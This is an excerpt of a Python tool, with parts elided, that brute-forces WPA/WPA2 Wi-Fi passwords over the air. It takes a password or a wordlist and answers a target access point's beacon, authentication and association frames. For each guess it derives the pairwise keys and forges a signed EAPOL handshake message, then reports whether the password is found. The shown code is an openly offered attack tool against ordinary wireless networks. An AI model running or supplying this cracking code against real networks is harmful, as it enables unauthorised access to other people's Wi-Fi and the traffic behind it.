...
parser.add_argument("-password", nargs='*',
                    metavar='12345678 123456789', help="password string")
parser.add_argument("-passwords", type=str,
                    metavar='wordlist.txt', help="passwords file")
parser.add_argument("-pmkid", dest="pmkid", action="store_true",
                    default=False, help="check PMKID")
...
class Brute:
    ...
    def PRF_512(key, A, B):
        return b''.join(
            hmac.new(key, A + chr(0).encode() + B + chr(i).encode(), hashlib.sha1).digest() for i in range(4))[:64]
    ...
    def handle_beacon(self, p):
        ...
        if self.target.lower() == seen_bssid.lower() and seen_essid == bytes(self.essid, 'utf8') and \
                Dot11Beacon in p:
            self.beacon = p
            return True
    ...
    def handle_authorization_response(self, p):
        ...
        if self.target.lower() == seen_bssid.lower() and \
            ...
            if debug:
                print(
                    "[*] Detected Authentication from Source {0}".format(seen_bssid))
    ...
    def handle_association_response(self, p):
        ...
        if self.target.lower() == seen_bssid.lower() and \
            ...
            if debug:
                print(
                    "[*] Detected Association Response from Source {0}".format(seen_bssid))
    ...
    def handle_m1(self, p):
        ...
        if self.target.lower() == seen_sender.lower() and \
            ...
            self.replay_counter = bytes(p[EAPOL].payload)[5:5+8]
    ...
    def auth(self, password):
        ...
        authorization_request = RadioTap() / Dot11(proto=0, FCfield=0, subtype=11, addr2=self.source, addr3=self.target,
                                                   addr1=self.target, SC=0, type=0) \
        ...
        association_request = RadioTap() / Dot11(proto=0, FCfield=0, subtype=0, addr2=self.source, addr3=self.target,
                                                 addr1=self.target, SC=0, type=0) \
        ...
        pmk = hashlib.pbkdf2_hmac(
            'sha1', password.encode(), self.essid.encode(), 4096, 32)
        snonce = self.get_rand(32)
        ptk = self.PRF_512(pmk, b"Pairwise key expansion",
                           min(self.b(self.target), self.b(self.source)) + max(self.b(self.target),
                                                                               self.b(self.source)) + min(self.anonce,
                                                                                                          snonce) + max(
                               self.anonce, snonce))
        kck = ptk[0:16]
        if debug:
        ...
        # Replay Counter
        eapol_data_4[5:5 + 8] = self.replay_counter
        eapol_data_4[13:13 + 32] = snonce  # WPA Key Nonce
        # WPA Key IV
        eapol_data_4[45:45 +
                     16] = b"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
        # WPA Key RSC
        eapol_data_4[61:61 + 8] = b"\x00\x00\x00\x00\x00\x00\x00\x00"
        # WPA Key ID
        eapol_data_4[69:69 + 8] = b"\x00\x00\x00\x00\x00\x00\x00\x00"
        # WPA Key MIC
        eapol_data_4[77:77 +
                     16] = b"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
        ...
        mic = hmac.new(kck, b"\x01\x03\x00\x75" + bytes(eapol_data_4[:77]) + bytes.fromhex(
            "00000000000000000000000000000000") + bytes(eapol_data_4[93:]), hashlib.sha1).digest()[0:16]
        eapol_data_4[77:77 + 16] = mic
        if debug:
            print("[*] MIC: {}".format(mic.hex()))

        m2 = RadioTap() / Dot11(proto=0, FCfield=1, addr2=self.source,
                                addr3=self.target, addr1=self.target, subtype=8,
                                SC=0, type=2, ID=55808) \
    ...
    while True:
        ...
        try:
            ...
            if brute.auth(password):
                print(f'{Fore.GREEN}[{brute.source}] password found: "{
                      password}" ({c}){Fore.RESET}')
                found = password
                break
            else:
                print(f'{Fore.LIGHTBLACK_EX}[{brute.source}] password wrong: "{
                      password}" ({c}){Fore.RESET}')
        except Exception as e:
            print(f'{Fore.RED}[{brute.source}] exception {
                  str(e)}: "{password}" ({c}){Fore.RESET}')
